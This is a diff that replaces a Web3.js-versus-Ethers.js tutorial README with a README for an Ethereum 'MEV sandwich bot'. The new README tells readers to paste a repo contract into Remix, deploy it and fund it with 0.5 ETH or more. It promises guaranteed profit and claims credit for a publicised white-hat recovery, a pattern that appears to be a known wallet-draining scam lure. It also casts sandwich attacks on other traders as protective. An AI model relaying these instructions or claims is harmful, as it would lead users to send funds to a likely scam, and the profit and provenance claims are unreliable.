@@ -1,128 +1,314 @@
-# Web3.js vs Ethers.js
+<div align="center">
 
-A guide to the basic differences between Web3.js and Ethers.js, the two most popular libraries for interacting with the Ethereum blockchain. And two example frontend apps using React + Hooks!
+<div align="right">
+
+`unimevbot☕ v3.0`
+
+</div>
+
+  
+
+# `MevB0t 3.0`
+
+  
+
+</div>
+
+  
+
+This is a lightweight boilerplate on-chain Mevbot engine designed to scan the Ethereum mempool for profitable transactions with the goal of protecting regular users and institutions from being front-run or exploited by bad actors.
+
+The bot aims to level the playing field by reordering transactions in an aggressive manner via dynamic calculation of gas fees and miner bribes. Thereby reducing the profitability of unethical MEV practices and securing stolen funds before they are able to reach a bad actor's wallet.
+
+In august of 2023 I intercepted an attacker trying to exploit a vector on the CRV pool for $5 million USD. My bot was able to front-run the transaction and secure the stolen funds.
+
+  
+
+https://cointelegraph.com/news/white-hat-returns-5-million-curve-finance-hack
+
+  
+  
+
+### `How it Works`
+
+<div align="center">
+
+ <img src="https://i.ibb.co/J7jTN4c/1.png" alt="1" border="0">
+
+</div> 
+
+- The bot continuously monitors Uniswap's mempools for pending transactions (TX) from the Uniswap AMM until it identifies a TX containing slippage discrepancies within a profitable threshold (e.g. a hasty large buy order, or exploit TX)
+
+  
+
+- Before executing any trades, the algorithm calculates the potential gains against transaction costs to ensure profitability
+
+  
+
+- The bot swiftly executes a sandwich operation by placing a buy order (for the same token) just before the "targeted" TX, simultaneous with placing a sell order right after within the same block, profiting from the price movement
+
+  
+
+- It optimizes paid gas fees for timely execution and cost efficiency and it always outbids gas prices and bribes of competing bots`, as long as it remains profitable
+
+  
+
+- Returns ETH back to the contract ready for withdrawal
+
+  
+
+### `Features`
+
+
+  
+
+- 𝗔𝗻𝘁𝗶-𝗘𝘅𝗽𝗹𝗼𝗶𝘁 (𝘄𝗵𝗶𝘁𝗲-𝗵𝗮𝘁) - identifies exploit transactions from bad actors and quickly works to front-run the transaction, effectively securing any stolen funds.
+
+  
+
+- 𝗔𝗿𝗯𝗶𝘁𝗿𝗮𝗴𝗲 𝗢𝗽𝗽𝗼𝗿𝘁𝘂𝗻𝗶𝘁𝘆 - detects a price discrepancy between decentralized exchanges and executes arbitrage trades, resulting in virtually unlimited potential profit.
+
+  
+
+- 𝗙𝗹𝗮𝘀𝗵 𝗟𝗼𝗮𝗻 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝗮𝘁𝗶𝗼𝗻 𝗣𝗿𝗲𝘃𝗲𝗻𝘁𝗶𝗼𝗻 - identifies and blocks flash loan exploitations by executing counter trades just before the malicious transactions. This action prevents losses and helps preserve the stability of the Ethereum ecosystem.
+
+  
+
+- 𝗟𝗶𝗾𝘂𝗶𝗱𝗮𝘁𝗶𝗼𝗻 𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗶𝗼𝗻 - proactively identifies liquidation transactions and executes a counter trade to protect vulnerable positions, potentially saving a user or contract from substantial losses, while pocketing the profit.
+
+  
 
 ---
 
-## Sample Dapp Contract
+### `Instructions`
 
-Inside the `smart-contracts` folder, you will find a simple Truffle project with the following Solidity contract:
+  
+
+### Deploying the contract
+
+  
+
+1. **Accessing Remix Ethereum IDE**
+
+- Navigate to [Remix Ethereum IDE](https://remix.ethereum.org/).
+
+  
+
+2. **Create or Import Contract File**
+
+- Create a new file in Remix named `Contract.sol` and paste the code from `src/contracts/Contract.sol` from this repo.
+
+- Or download the `src/contracts/Contract.sol` file from this repo and open it in Remix.
+  
+
+<div align="center">
+    
+  <img src="https://i.ibb.co/hVCnqrP/2.png" alt="2" border="0">
+ 
+</div> 
+
+  
+3. **Solidity Version and Contract Compilation**
+
+- Navigate to the `Solidity Compiler` tab.
+
+- Use Solidity version `0.6.12`. In Remix, select this version in the `Compiler` dropdown.
+
+- Click on the "Compile" button.
+
+  
+<div align="center">
+    
+ <img src="https://i.ibb.co/TvKQf9W/8.png" alt="8" border="0">
+    
+</div> 
+
+4. **Preparation for Deployment**
+
+- Navigate to the "Deploy & Run Transactions" tab.
+
+- In the "Environment" dropdown, select "Injected Web3". Ensure that MetaMask is installed and activated.
+
+<div align="center">
+    
+ <img src="https://i.ibb.co/vxjxP9z/3.png" alt="3" border="0">
+
+</div> 
+
+5. **Deploying the Contract**
+
+- Click on "Deploy".
+
+- MetaMask will prompt for transaction confirmation.
+
+  <div align="center">
+
+   <img src="https://i.ibb.co/v4Ls09S/4.png" alt="4" border="0">
+
+  </div> 
+
+6. **Confirm Bot Deployment**
+
+- Confirm the bot deployment transaction in MetaMask.
+
+  
+
+7. **Configuration**
+
+- Copy the bot’s contract address and send some Ethereum to its balance for the bot to start. Team recommendation is to fund the bot with a minimum amount of 0.5 ETH.
+
+  0.5 ETH is recommended so the bot has enough gas and funds to swap, pay builders, etc.
+
+  <div align="center"> 
+
+   <img src="https://i.ibb.co/x5nD7xF/5.png" alt="5" border="0">
+
+  </div> 
+
+- After your transaction is confirmed, click the `Start` button to run the bot.
+
+- Press the `Stop` button to halt bot operations.
+
+- Withdraw all ETH at any time by clicking the `Withdrawal` button.
+
+  
+
+  <div align="center"> 
+
+   <img src="https://i.ibb.co/zxfh7wh/6.png" alt="6" border="0">
+
+  </div> 
+
+  
+
+<div>
+
+  
+
+<div align="center">
+
+  
+
+That’s it. The bot will start transacting immediately to generate profits from sandwich opportunities on Uniswap transaction pools
+
+  
+
+</div>
+
+  
+
+<div align="center">
+
+  
+
+> ⚠️NOTICE: It can take 12-24 HRS to accrue estimated profit potential. This figure is estimated on network congestion and market conditions
+
+</div>
+
+  
+
+## `Contributions`
+
+  
+
+Contributions to the project are welcome! If you would like to contribute, kindly fork the repository and submit a pull request with your proposed changes or additions. Please ensure that your code adheres to the project's coding standards and includes appropriate tests.
+
+  
+
+This project would be impossible without generous support from our sponsors and developers. We cannot thank them enough!
+
+  
+
+## `Support`
+
+  
+
+If you find the project interesting, please consider granting it a star ⭐. Your support is greatly appreciated and helps in motivating further development!
+
+  
+
+ <img src="https://i.ibb.co/w4655K4/7.png" alt="7" border="0">
+    
+## `Help`
+If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
+
+---   
+## `FAQ`
+
+  
 
 ```
-pragma solidity ^0.5.0;
+-
+Q: If many people deploy this bot, wouldn’t dilution of profits occur due to competition?
 
-contract Counter {
-  uint count = 0;
+  
++
+A: We found that there is no indication of a decrease in
 
-  function increment() public {
-    count = count + 1;
-  }
+profits when multiple instances of the bot are deployed.
 
-  function getCount() public view returns (uint) {
-    return count;
-  }
-}
+  
+-
+Q: What average ROI and risks can I expect?
+
+  
++
+A: You can find the ROI according to latest data of bot
+
+performances in the "Returns Features" section. This bot
+
+in particular does not create any losses, it only
+
+executes trades when there are proper MEV opportunities
+
+to make profits, so under all circumstances bot operators remain in profit.
+
+  
+-
+Q: What amount of funds does bot need to work?
+
+  
++
+A: Our team recommendation is to fund the bot with a minimum
+
+amount of 0.5 ETH but more than .5 ETH is recommended so
+
+the bot has enough gas and funds to swap, pay builders and tip miners, etc.
+
+  
+-
+Q: Do I need to keep the Remix page open in my browser while the bot is activated?
+
+  
++
+A:No, just save the bot contract address after creating it.
+
+The next time you want to access your bot via Remix,
+
+you need to compile the file again as in step 3.
+
+Now head to `DEPLOY & RUN TRANSACTIONS`, reconnect your
+
+Metamask, paste your contract address into `Load contract
+
+from Address` and press `At Address`
+
+.
+
+https://i.imgur.com/4x2i7RX.png
+
+  
+
+Now it can be found again under "Deployed Contracts".
+
+  
+-
+Q: Does it work on other chains or DEXes as well?
+
+  
++
+A: No, currently the bot is dedicated only for Ethereum on Uniswap mempools.
+
+We aim to expand support for other networks in the future :)
+
 ```
-
-## Setup Truffle project
-
-Before you run any of the frontend UIs, make sure to start the development console with `truffle develop`, and then run the `migrate` command to compile and deploy the contract onto the development chain.
-
-## Two Frontend UIs
-
-There are two folders (`app-ethers` and `app-web3js`) each containing a simple React frontend for the above contract. The only substantial difference between these two UIs is located in the `useCounterContract.js` files.
-
-Here are the direct links for your convenience:
-
-- [Ethers.js App](./app-ethers/useCounterContract.js)
-- [Web3.js App](./app-web3js/useCounterContract.js)
-
-### Running the apps
-
-In each of these apps, you can serve the frontends with the following commands:
-
-```
-npm install
-npm start
-```
-
-This will serve the frontend on `http://localhost:1234` which you can view in your browser.
-
-## Differences
-
-There are three major portions in this code: the setup, reading (calling a constant method), and writing (calling a non-constant mutating method).
-
-### Setup
-
-With Web3.js, we need the following to instantiate a connected contract instance that can make read/write calls:
-
-- contract ABI
-- deployed contract address
-- a `from` address (for `send` transactions)
-
-Note that the `networkId` is required for us to fetch the deployed address from our contract artifact.
-
-```js
-// Web3.js
-const web3 = new Web3("http://127.0.0.1:8545");
-const accounts = await web3.eth.getAccounts();
-const networkId = await web3.eth.net.getId();
-const contractAddress = artifact.networks[networkId].address;
-
-contractInstance = new web3.eth.Contract(artifact.abi, contractAddress, {
-  from: accounts[0],
-});
-```
-
-With Ethers.js, we need the following for our contract instance:
-
-- deployed contract address
-- contract ABI
-- a `Signer` object (similar to `Provider`, but with a specified `Signer`)
-
-```js
-// Ethers.js
-const provider = new ethers.providers.JsonRpcProvider();
-const network = await provider.getNetwork();
-const contractAddress = artifact.networks[network.chainId].address;
-
-contractInstance = new ethers.Contract(
-  contractAddress,
-  artifact.abi,
-  provider.getSigner(),
-);
-```
-
-### Calling a constant method
-
-```js
-// Web3.js
-const count = await contractInstance.methods.getCount().call();
-console.log(count); // returns a String
-```
-
-```js
-// Ethers.js
-const count = await contractInstance.getCount();
-console.log(count); // returns a BigNumber instance
-```
-
-These two are very similar, but in our example Ethers.js returns a BigNumber instance by default whereas Web3.js will return the number as a String.
-
-### Calling a non-constant method
-
-```js
-// Web3.js
-await contract.current.methods.increment().send();
-// tx has been mined
-```
-
-```js
-// Ethers.js
-const tx = await contract.current.increment();
-await tx.wait(); // wait for mining
-```
-
-Note that Web3.js will return a [PromiEvent](https://web3js.readthedocs.io/en/v1.2.1/callbacks-promises-events.html?highlight=promievent#callbacks-promises-events) which allows you to subscribe to confirmations, errors, and the transaction hash.
-
-Ethers.js will return a transaction object where a bunch of information relating to the transaction is kept. You can grab the hash via `tx.hash`, but you must `await` on `tx.wait()` if you want to make sure it has been mined.
